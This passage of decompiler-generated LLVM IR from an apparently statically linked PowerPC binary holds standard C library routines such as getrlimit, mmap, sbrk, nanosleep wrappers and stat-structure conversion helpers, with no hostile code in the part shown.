  %v3_1000d694 = add i32 %v0_1000d690, 10
  %v4_1000d694 = inttoptr i32 %v3_1000d694 to i8*
  store i8 %v1_1000d694, i8* %v4_1000d694, align 1
  %v0_1000d698 = load i32, i32* @r31, align 4
  %v1_1000d698 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000d698 = add i32 %v1_1000d698, %v0_1000d698
  store i32 %v2_1000d698, i32* @r31, align 4
  %v1_1000d69c = load i32, i32* @r26, align 4
  %v2_1000d69c = icmp ult i32 %v2_1000d698, %v1_1000d69c
  %v1_1000d6a0 = add i32 %v2_1000d698, 10
  store i32 %v1_1000d6a0, i32* @r30, align 4
  %v1_1000d6a8 = add i32 %v2_1000d698, 11
  store i32 %v1_1000d6a8, i32* @r28, align 4
  br i1 %v2_1000d69c, label %dec_label_pc_1000d670, label %dec_label_pc_1000d6b0

dec_label_pc_1000d6b0:                            ; preds = %dec_label_pc_1000d670, %dec_label_pc_1000d69c.preheader, %dec_label_pc_1000d65c, %dec_label_pc_1000d640
  store i32 %v0_1000d618, i32* %r0.global-to-local, align 4
  %v0_1000d6b4 = load i32, i32* @r27, align 4
  ret i32 %v0_1000d6b4

; uselistorder directives
  uselistorder i32 %v1_1000d6a0, { 1, 0 }
  uselistorder i32 %v2_1000d698, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v0_1000d664, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v0_1000d634, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @memmove, { 5, 6, 7, 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d670, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000d6d4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268490464, i32* @lr, align 4
  %v2_1000d6dc = call i32 @getrlimit(i32 7, i32 %v2_1000d6d4)
  %v1_1000d6e0 = icmp slt i32 %v2_1000d6dc, 0
  br i1 %v1_1000d6e0, label %dec_label_pc_1000d6f0, label %dec_label_pc_1000d6ec

dec_label_pc_1000d6ec:                            ; preds = %entry
  %v3_1000d6ec = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000d6f0

dec_label_pc_1000d6f0:                            ; preds = %entry, %dec_label_pc_1000d6ec
  %v0_1000d6fc = phi i32 [ 256, %entry ], [ %v3_1000d6ec, %dec_label_pc_1000d6ec ]
  ret i32 %v0_1000d6fc

; uselistorder directives
  uselistorder label %dec_label_pc_1000d6f0, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v0_1000d708 = call i32 @__asm_mfcr()
  ret i32 %v0_1000d708
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v0_1000d718 = call i32 @__asm_mfcr()
  ret i32 %v0_1000d718
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000d728 = call i32 @__asm_mfcr()
  ret i32 %v0_1000d728
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v3_1000d738 = load i32, i32* @global_var_10021238.549, align 4
  %v3_1000d73c = icmp eq i32 %v3_1000d738, 0
  %v0_1000d740 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d73c, i32 %v0_1000d740)
  ret i32 %v3_1000d738
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1000d754 = call i32 @__asm_mfcr()
  %v1_1000d758 = and i32 %v0_1000d754, 268435456
  %v3_1000d758 = icmp eq i32 %v1_1000d758, 0
  %v0_1000d760 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d758, i32 %v0_1000d760)
  %v0_1000d770 = load i32, i32* @r2, align 4
  %v1_1000d774 = add i32 %v0_1000d770, -28672
  %v2_1000d778 = inttoptr i32 %v1_1000d774 to i32*
  store i32 %v0_1000d754, i32* %v2_1000d778, align 4
  ret i32 -1
}

define i32 @getuid(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000d788 = call i32 @__asm_mfcr()
  ret i32 %v0_1000d788
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %v0_1000d798 = call i32 @__asm_mfcr()
  %v1_1000d79c = and i32 %v0_1000d798, 268435456
  %v3_1000d79c = icmp eq i32 %v1_1000d79c, 0
  %v0_1000d7a4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d79c, i32 %v0_1000d7a4)
  %v0_1000d7b4 = load i32, i32* @r2, align 4
  %v1_1000d7b8 = add i32 %v0_1000d7b4, -28672
  %v2_1000d7bc = inttoptr i32 %v1_1000d7b8 to i32*
  store i32 %v0_1000d798, i32* %v2_1000d7bc, align 4
  ret i32 -1
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_1000d7cc = call i32 @__asm_mfcr()
  %v1_1000d7d0 = and i32 %v0_1000d7cc, 268435456
  %v3_1000d7d0 = icmp eq i32 %v1_1000d7d0, 0
  %v0_1000d7d8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d7d0, i32 %v0_1000d7d8)
  %v0_1000d7e8 = load i32, i32* @r2, align 4
  %v1_1000d7ec = add i32 %v0_1000d7e8, -28672
  %v2_1000d7f0 = inttoptr i32 %v1_1000d7ec to i32*
  store i32 %v0_1000d7cc, i32* %v2_1000d7f0, align 4
  ret i32 -1
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_1000d800 = call i32 @__asm_mfcr()
  %v1_1000d804 = and i32 %v0_1000d800, 268435456
  %v3_1000d804 = icmp eq i32 %v1_1000d804, 0
  store i1 %v3_1000d804, i1* @cr0_eq, align 1
  %v0_1000d80c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d804, i32 %v0_1000d80c)
  %v0_1000d81c = load i32, i32* @r2, align 4
  %v1_1000d820 = add i32 %v0_1000d81c, -28672
  %v2_1000d824 = inttoptr i32 %v1_1000d820 to i32*
  store i32 %v0_1000d800, i32* %v2_1000d824, align 4
  ret i32 -1
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %v0_1000d834 = call i32 @__asm_mfcr()
  %v1_1000d838 = and i32 %v0_1000d834, 268435456
  %v3_1000d838 = icmp eq i32 %v1_1000d838, 0
  %v0_1000d840 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d838, i32 %v0_1000d840)
  %v0_1000d850 = load i32, i32* @r2, align 4
  %v1_1000d854 = add i32 %v0_1000d850, -28672
  store i32 %v1_1000d854, i32* @r9, align 4
  %v2_1000d858 = inttoptr i32 %v1_1000d854 to i32*
  store i32 %v0_1000d834, i32* %v2_1000d858, align 4
  ret i32 -1
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r31, align 4
  %v0_1000d878 = load i32, i32* @r2, align 4
  %v1_1000d878 = add i32 %v0_1000d878, -29808
  %v2_1000d878 = inttoptr i32 %v1_1000d878 to i32*
  %v3_1000d878 = load i32, i32* %v2_1000d878, align 4
  %v3_1000d87c = icmp eq i32 %v3_1000d878, 0
  br i1 %v3_1000d87c, label %dec_label_pc_1000d884, label %dec_label_pc_1000d898

dec_label_pc_1000d884:                            ; preds = %entry
  %v0_1000d894 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_1000d898

dec_label_pc_1000d898:                            ; preds = %entry, %dec_label_pc_1000d884
  store i32 268490908, i32* @lr, align 4
  %v0_1000d898 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_1000d898, i32* @r28, align 4
  store i32 268490924, i32* @lr, align 4
  %v0_1000d8a8 = call i32 @__syscall_nanosleep()
  store i32 %v0_1000d8a8, i32* @r29, align 4
  %v0_1000d8b0 = load i32, i32* @r28, align 4
  %v1_1000d8b4 = call i32 @__libc_disable_asynccancel(i32 %v0_1000d8b0)
  %v0_1000d8bc = load i32, i32* @r29, align 4
  ret i32 %v0_1000d8bc

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 3, 5, 6, 1, 4, 10, 2, 11, 9, 8, 12, 7, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 3, 5, 6, 1, 4, 10, 2, 11, 9, 8, 12, 7, 0 }
  uselistorder label %dec_label_pc_1000d898, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  %v3_1000d8e8 = load i32, i32* @global_var_10021274.557, align 4
  %v3_1000d8ec = icmp eq i32 %v3_1000d8e8, 0
  br i1 %v3_1000d8ec, label %dec_label_pc_1000d8f4, label %dec_label_pc_1000d904

dec_label_pc_1000d8f4:                            ; preds = %entry
  store i32 268491004, i32* @lr, align 4
  %v1_1000d8f8 = call i32 @__GI_brk(i32 0)
  %v1_1000d8fc = icmp slt i32 %v1_1000d8f8, 0
  br i1 %v1_1000d8fc, label %dec_label_pc_1000d928, label %dec_label_pc_1000d8f4.dec_label_pc_1000d904_crit_edge

dec_label_pc_1000d8f4.dec_label_pc_1000d904_crit_edge: ; preds = %dec_label_pc_1000d8f4
  %v0_1000d904.pre = load i32, i32* @r30, align 4
  %v3_1000d90c.pre = load i32, i32* @global_var_10021274.557, align 4
  br label %dec_label_pc_1000d904

dec_label_pc_1000d904:                            ; preds = %dec_label_pc_1000d8f4.dec_label_pc_1000d904_crit_edge, %entry
  %v3_1000d90c = phi i32 [ %v3_1000d90c.pre, %dec_label_pc_1000d8f4.dec_label_pc_1000d904_crit_edge ], [ %v3_1000d8e8, %entry ]
  %v1_1000d918 = phi i32 [ %v0_1000d904.pre, %dec_label_pc_1000d8f4.dec_label_pc_1000d904_crit_edge ], [ %arg1, %entry ]
  %v3_1000d904 = icmp eq i32 %v1_1000d918, 0
  store i32 %v3_1000d90c, i32* @r31, align 4
  br i1 %v3_1000d904, label %dec_label_pc_1000d92c, label %dec_label_pc_1000d914

dec_label_pc_1000d914:                            ; preds = %dec_label_pc_1000d904
  %v2_1000d918 = add i32 %v1_1000d918, %v3_1000d90c
  store i32 268491040, i32* @lr, align 4
  %v1_1000d91c = call i32 @__GI_brk(i32 %v2_1000d918)
  %tmp6 = icmp sgt i32 %v1_1000d91c, -1
  br i1 %tmp6, label %dec_label_pc_1000d914.dec_label_pc_1000d92c_crit_edge, label %dec_label_pc_1000d928

dec_label_pc_1000d914.dec_label_pc_1000d92c_crit_edge: ; preds = %dec_label_pc_1000d914
  %v0_1000d930.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d92c

dec_label_pc_1000d928:                            ; preds = %dec_label_pc_1000d914, %dec_label_pc_1000d8f4
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_1000d92c

dec_label_pc_1000d92c:                            ; preds = %dec_label_pc_1000d914.dec_label_pc_1000d92c_crit_edge, %dec_label_pc_1000d904, %dec_label_pc_1000d928
  %v0_1000d930 = phi i32 [ %v0_1000d930.pre, %dec_label_pc_1000d914.dec_label_pc_1000d92c_crit_edge ], [ %v3_1000d90c, %dec_label_pc_1000d904 ], [ -1, %dec_label_pc_1000d928 ]
  ret i32 %v0_1000d930

; uselistorder directives
  uselistorder i32 %v3_1000d90c, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_1000d92c, { 2, 0, 1 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000d94c = call i32 @__asm_mfcr()
  ret i32 %v0_1000d94c
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_1000d958 = load i32, i32* @lr, align 4
  store i32 %v0_1000d958, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r28.global-to-local, align 4
  store i32 %tmp, i32* %r29.global-to-local, align 4
  store i32 268491132, i32* @lr, align 4
  %v3_1000d978 = call i32 @__GI_memset(i32 %arg2, i32 0, i32 104)
  %v2_1000d97c = load i32, i32* %arg1, align 4
  store i32 %v2_1000d97c, i32* %r9.global-to-local, align 4
  %v1_1000d980 = add i32 %tmp, 4
  %v2_1000d980 = inttoptr i32 %v1_1000d980 to i32*
  %v3_1000d980 = load i32, i32* %v2_1000d980, align 4
  store i32 %v3_1000d980, i32* %r10.global-to-local, align 4
  %v1_1000d984 = add i32 %tmp, 56
  %v2_1000d984 = inttoptr i32 %v1_1000d984 to i32*
  %v3_1000d984 = load i32, i32* %v2_1000d984, align 4
  store i32 %v3_1000d984, i32* %r0.global-to-local, align 4
  %v1_1000d988 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000d988 = inttoptr i32 %v1_1000d988 to i32*
  store i32 %v2_1000d97c, i32* %v2_1000d988, align 4
  %v0_1000d98c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d98c = load i32, i32* %r28.global-to-local, align 4
  %v2_1000d98c = add i32 %v1_1000d98c, 4
  %v3_1000d98c = inttoptr i32 %v2_1000d98c to i32*
  store i32 %v0_1000d98c, i32* %v3_1000d98c, align 4
  %v0_1000d990 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000d990 = add i32 %v0_1000d990, 16
  %v2_1000d990 = inttoptr i32 %v1_1000d990 to i32*
  %v3_1000d990 = load i32, i32* %v2_1000d990, align 4
  store i32 %v3_1000d990, i32* %r11.global-to-local, align 4
  %v1_1000d994 = add i32 %v0_1000d990, 8
  %v2_1000d994 = inttoptr i32 %v1_1000d994 to i32*
  %v3_1000d994 = load i32, i32* %v2_1000d994, align 4
  store i32 %v3_1000d994, i32* %r9.global-to-local, align 4
  %v1_1000d998 = add i32 %v0_1000d990, 12
  %v2_1000d998 = inttoptr i32 %v1_1000d998 to i32*
  %v3_1000d998 = load i32, i32* %v2_1000d998, align 4
  store i32 %v3_1000d998, i32* %r10.global-to-local, align 4
  %v0_1000d99c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d99c = load i32, i32* %r28.global-to-local, align 4
  %v2_1000d99c = add i32 %v1_1000d99c, 56
  %v3_1000d99c = inttoptr i32 %v2_1000d99c to i32*
  store i32 %v0_1000d99c, i32* %v3_1000d99c, align 4
  %v0_1000d9a0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d9a0 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000d9a0 = add i32 %v1_1000d9a0, 16
  %v3_1000d9a0 = inttoptr i32 %v2_1000d9a0 to i32*
  store i32 %v0_1000d9a0, i32* %v3_1000d9a0, align 4
  %v0_1000d9a4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d9a4 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000d9a4 = add i32 %v1_1000d9a4, 8
  %v3_1000d9a4 = inttoptr i32 %v2_1000d9a4 to i32*
  store i32 %v0_1000d9a4, i32* %v3_1000d9a4, align 4
  %v0_1000d9a8 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d9a8 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000d9a8 = add i32 %v1_1000d9a8, 12
  %v3_1000d9a8 = inttoptr i32 %v2_1000d9a8 to i32*
  store i32 %v0_1000d9a8, i32* %v3_1000d9a8, align 4
  %v0_1000d9ac = load i32, i32* %r29.global-to-local, align 4
  %v1_1000d9ac = add i32 %v0_1000d9ac, 20
  %v2_1000d9ac = inttoptr i32 %v1_1000d9ac to i32*
  %v3_1000d9ac = load i32, i32* %v2_1000d9ac, align 4
  store i32 %v3_1000d9ac, i32* %r0.global-to-local, align 4
  %v1_1000d9b0 = add i32 %v0_1000d9ac, 72
  %v2_1000d9b0 = inttoptr i32 %v1_1000d9b0 to i32*
  %v3_1000d9b0 = load i32, i32* %v2_1000d9b0, align 4
  store i32 %v3_1000d9b0, i32* %r8.global-to-local, align 4
  %v1_1000d9b4 = add i32 %v0_1000d9ac, 32
  %v2_1000d9b4 = inttoptr i32 %v1_1000d9b4 to i32*
  %v3_1000d9b4 = load i32, i32* %v2_1000d9b4, align 4
  store i32 %v3_1000d9b4, i32* %r9.global-to-local, align 4
  %v1_1000d9b8 = add i32 %v0_1000d9ac, 36
  %v2_1000d9b8 = inttoptr i32 %v1_1000d9b8 to i32*
  %v3_1000d9b8 = load i32, i32* %v2_1000d9b8, align 4
  store i32 %v3_1000d9b8, i32* %r10.global-to-local, align 4
  %v1_1000d9bc = add i32 %v0_1000d9ac, 76
  %v2_1000d9bc = inttoptr i32 %v1_1000d9bc to i32*
  %v3_1000d9bc = load i32, i32* %v2_1000d9bc, align 4
  store i32 %v3_1000d9bc, i32* %r11.global-to-local, align 4
  %v1_1000d9c0 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000d9c0 = add i32 %v1_1000d9c0, 20
  %v3_1000d9c0 = inttoptr i32 %v2_1000d9c0 to i32*
  store i32 %v3_1000d9ac, i32* %v3_1000d9c0, align 4
  %v0_1000d9c4 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000d9c4 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000d9c4 = add i32 %v1_1000d9c4, 72
  %v3_1000d9c4 = inttoptr i32 %v2_1000d9c4 to i32*
  store i32 %v0_1000d9c4, i32* %v3_1000d9c4, align 4
  %v0_1000d9c8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d9c8 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000d9c8 = add i32 %v1_1000d9c8, 32
  %v3_1000d9c8 = inttoptr i32 %v2_1000d9c8 to i32*
  store i32 %v0_1000d9c8, i32* %v3_1000d9c8, align 4
  %v0_1000d9cc = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d9cc = load i32, i32* %r28.global-to-local, align 4
  %v2_1000d9cc = add i32 %v1_1000d9cc, 36
  %v3_1000d9cc = inttoptr i32 %v2_1000d9cc to i32*
  store i32 %v0_1000d9cc, i32* %v3_1000d9cc, align 4
  %v0_1000d9d0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d9d0 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000d9d0 = add i32 %v1_1000d9d0, 76
  %v3_1000d9d0 = inttoptr i32 %v2_1000d9d0 to i32*
  store i32 %v0_1000d9d0, i32* %v3_1000d9d0, align 4
  %v0_1000d9d4 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000d9d4 = add i32 %v0_1000d9d4, 80
  %v2_1000d9d4 = inttoptr i32 %v1_1000d9d4 to i32*
  %v3_1000d9d4 = load i32, i32* %v2_1000d9d4, align 4
  store i32 %v3_1000d9d4, i32* %r8.global-to-local, align 4
  %v1_1000d9d8 = add i32 %v0_1000d9d4, 24
  %v2_1000d9d8 = inttoptr i32 %v1_1000d9d8 to i32*
  %v3_1000d9d8 = load i32, i32* %v2_1000d9d8, align 4
  store i32 %v3_1000d9d8, i32* %r11.global-to-local, align 4
  %v1_1000d9dc = add i32 %v0_1000d9d4, 48
  %v2_1000d9dc = inttoptr i32 %v1_1000d9dc to i32*
  %v3_1000d9dc = load i32, i32* %v2_1000d9dc, align 4
  store i32 %v3_1000d9dc, i32* %r9.global-to-local, align 4
  %v1_1000d9e0 = add i32 %v0_1000d9d4, 52
  %v2_1000d9e0 = inttoptr i32 %v1_1000d9e0 to i32*
  %v3_1000d9e0 = load i32, i32* %v2_1000d9e0, align 4
  store i32 %v3_1000d9e0, i32* %r10.global-to-local, align 4
  %v1_1000d9e4 = add i32 %v0_1000d9d4, 84
  %v2_1000d9e4 = inttoptr i32 %v1_1000d9e4 to i32*
  %v3_1000d9e4 = load i32, i32* %v2_1000d9e4, align 4
  store i32 %v3_1000d9e4, i32* %r0.global-to-local, align 4
  %v1_1000d9e8 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000d9e8 = add i32 %v1_1000d9e8, 80
  %v3_1000d9e8 = inttoptr i32 %v2_1000d9e8 to i32*
  store i32 %v3_1000d9d4, i32* %v3_1000d9e8, align 4
  %v0_1000d9ec = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d9ec = load i32, i32* %r28.global-to-local, align 4
  %v2_1000d9ec = add i32 %v1_1000d9ec, 24
  %v3_1000d9ec = inttoptr i32 %v2_1000d9ec to i32*
  store i32 %v0_1000d9ec, i32* %v3_1000d9ec, align 4
  %v0_1000d9f0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d9f0 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000d9f0 = add i32 %v1_1000d9f0, 48
  %v3_1000d9f0 = inttoptr i32 %v2_1000d9f0 to i32*
  store i32 %v0_1000d9f0, i32* %v3_1000d9f0, align 4
  %v0_1000d9f4 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d9f4 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000d9f4 = add i32 %v1_1000d9f4, 52
  %v3_1000d9f4 = inttoptr i32 %v2_1000d9f4 to i32*
  store i32 %v0_1000d9f4, i32* %v3_1000d9f4, align 4
  %v0_1000d9f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d9f8 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000d9f8 = add i32 %v1_1000d9f8, 84
  %v3_1000d9f8 = inttoptr i32 %v2_1000d9f8 to i32*
  store i32 %v0_1000d9f8, i32* %v3_1000d9f8, align 4
  %v0_1000d9fc = load i32, i32* %r29.global-to-local, align 4
  %v1_1000d9fc = add i32 %v0_1000d9fc, 28
  %v2_1000d9fc = inttoptr i32 %v1_1000d9fc to i32*
  %v3_1000d9fc = load i32, i32* %v2_1000d9fc, align 4
  store i32 %v3_1000d9fc, i32* %r11.global-to-local, align 4
  %v1_1000da00 = add i32 %v0_1000d9fc, 88
  %v2_1000da00 = inttoptr i32 %v1_1000da00 to i32*
  %v3_1000da00 = load i32, i32* %v2_1000da00, align 4
  store i32 %v3_1000da00, i32* %r0.global-to-local, align 4
  %v1_1000da04 = add i32 %v0_1000d9fc, 92
  %v2_1000da04 = inttoptr i32 %v1_1000da04 to i32*
  %v3_1000da04 = load i32, i32* %v2_1000da04, align 4
  store i32 %v3_1000da04, i32* %r8.global-to-local, align 4
  %v1_1000da08 = add i32 %v0_1000d9fc, 64
  %v2_1000da08 = inttoptr i32 %v1_1000da08 to i32*
  %v3_1000da08 = load i32, i32* %v2_1000da08, align 4
  store i32 %v3_1000da08, i32* %r9.global-to-local, align 4
  %v1_1000da0c = add i32 %v0_1000d9fc, 68
  %v2_1000da0c = inttoptr i32 %v1_1000da0c to i32*
  %v3_1000da0c = load i32, i32* %v2_1000da0c, align 4
  store i32 %v3_1000da0c, i32* %r10.global-to-local, align 4
  %v1_1000da10 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000da10 = add i32 %v1_1000da10, 28
  %v3_1000da10 = inttoptr i32 %v2_1000da10 to i32*
  store i32 %v3_1000d9fc, i32* %v3_1000da10, align 4
  %v0_1000da14 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000da14 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000da14 = add i32 %v1_1000da14, 88
  %v3_1000da14 = inttoptr i32 %v2_1000da14 to i32*
  store i32 %v0_1000da14, i32* %v3_1000da14, align 4
  store i32 %v0_1000d958, i32* %r0.global-to-local, align 4
  %v0_1000da1c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000da1c = load i32, i32* %r28.global-to-local, align 4
  %v2_1000da1c = add i32 %v1_1000da1c, 64
  %v3_1000da1c = inttoptr i32 %v2_1000da1c to i32*
  store i32 %v0_1000da1c, i32* %v3_1000da1c, align 4
  %v0_1000da20 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000da20 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000da20 = add i32 %v1_1000da20, 68
  %v3_1000da20 = inttoptr i32 %v2_1000da20 to i32*
  store i32 %v0_1000da20, i32* %v3_1000da20, align 4
  %v0_1000da28 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000da28 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000da28 = add i32 %v1_1000da28, 92
  %v3_1000da28 = inttoptr i32 %v2_1000da28 to i32*
  store i32 %v0_1000da28, i32* %v3_1000da28, align 4
  ret i32 %v3_1000d978

; uselistorder directives
  uselistorder i32 %v0_1000d9fc, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_1000d9d4, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_1000d9ac, { 0, 2, 1, 3, 4 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r28.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 20, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21 }
  uselistorder i32 104, { 0, 4, 8, 1, 5, 3, 6, 2, 7 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_1000da3c = load i32, i32* @lr, align 4
  store i32 %v0_1000da3c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 %tmp, i32* %r29.global-to-local, align 4
  store i32 268491360, i32* @lr, align 4
  %v3_1000da5c = call i32 @__GI_memset(i32 %arg2, i32 0, i32 88)
  %v2_1000da60 = load i32, i32* %arg1, align 4
  store i32 %v2_1000da60, i32* %r9.global-to-local, align 4
  %v1_1000da64 = add i32 %tmp, 4
  %v2_1000da64 = inttoptr i32 %v1_1000da64 to i32*
  %v3_1000da64 = load i32, i32* %v2_1000da64, align 4
  store i32 %v3_1000da64, i32* %r10.global-to-local, align 4
  %v1_1000da68 = load i32, i32* @r28, align 4
  %v2_1000da68 = inttoptr i32 %v1_1000da68 to i32*
  store i32 %v2_1000da60, i32* %v2_1000da68, align 4
  %v0_1000da6c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000da6c = load i32, i32* @r28, align 4
  %v2_1000da6c = add i32 %v1_1000da6c, 4
  %v3_1000da6c = inttoptr i32 %v2_1000da6c to i32*
  store i32 %v0_1000da6c, i32* %v3_1000da6c, align 4
  %v0_1000da70 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000da70 = add i32 %v0_1000da70, 16
  %v2_1000da70 = inttoptr i32 %v1_1000da70 to i32*
  %v3_1000da70 = load i32, i32* %v2_1000da70, align 4
  store i32 %v3_1000da70, i32* %r0.global-to-local, align 4
  %v1_1000da74 = add i32 %v0_1000da70, 32
  %v2_1000da74 = inttoptr i32 %v1_1000da74 to i32*
  %v3_1000da74 = load i32, i32* %v2_1000da74, align 4
  store i32 %v3_1000da74, i32* %r9.global-to-local, align 4
  %v1_1000da78 = add i32 %v0_1000da70, 36
  %v2_1000da78 = inttoptr i32 %v1_1000da78 to i32*
  %v3_1000da78 = load i32, i32* %v2_1000da78, align 4
  store i32 %v3_1000da78, i32* %r10.global-to-local, align 4
  %v1_1000da7c = load i32, i32* @r28, align 4
  %v2_1000da7c = add i32 %v1_1000da7c, 16
  %v3_1000da7c = inttoptr i32 %v2_1000da7c to i32*
  store i32 %v3_1000da70, i32* %v3_1000da7c, align 4
  %v0_1000da80 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000da80 = add i32 %v0_1000da80, 12
  %v2_1000da80 = inttoptr i32 %v1_1000da80 to i32*
  %v3_1000da80 = load i32, i32* %v2_1000da80, align 4
  store i32 %v3_1000da80, i32* %r0.global-to-local, align 4
  %v0_1000da84 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000da84 = load i32, i32* @r28, align 4
  %v2_1000da84 = add i32 %v1_1000da84, 32
  %v3_1000da84 = inttoptr i32 %v2_1000da84 to i32*
  store i32 %v0_1000da84, i32* %v3_1000da84, align 4
  %v0_1000da88 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000da88 = load i32, i32* @r28, align 4
  %v2_1000da88 = add i32 %v1_1000da88, 36
  %v3_1000da88 = inttoptr i32 %v2_1000da88 to i32*
  store i32 %v0_1000da88, i32* %v3_1000da88, align 4
  %v0_1000da8c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000da8c = load i32, i32* @r28, align 4
  %v2_1000da8c = add i32 %v1_1000da8c, 12
  %v3_1000da8c = inttoptr i32 %v2_1000da8c to i32*
  store i32 %v0_1000da8c, i32* %v3_1000da8c, align 4
  %v0_1000da90 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000da90 = add i32 %v0_1000da90, 52
  %v2_1000da90 = inttoptr i32 %v1_1000da90 to i32*
  %v3_1000da90 = load i32, i32* %v2_1000da90, align 4
  store i32 %v3_1000da90, i32* %r0.global-to-local, align 4
  %v1_1000da94 = add i32 %v0_1000da90, 68
  %v2_1000da94 = inttoptr i32 %v1_1000da94 to i32*
  %v3_1000da94 = load i32, i32* %v2_1000da94, align 4
  store i32 %v3_1000da94, i32* %r9.global-to-local, align 4
  %v1_1000da98 = load i32, i32* @r28, align 4
  %v2_1000da98 = add i32 %v1_1000da98, 44
  %v3_1000da98 = inttoptr i32 %v2_1000da98 to i32*
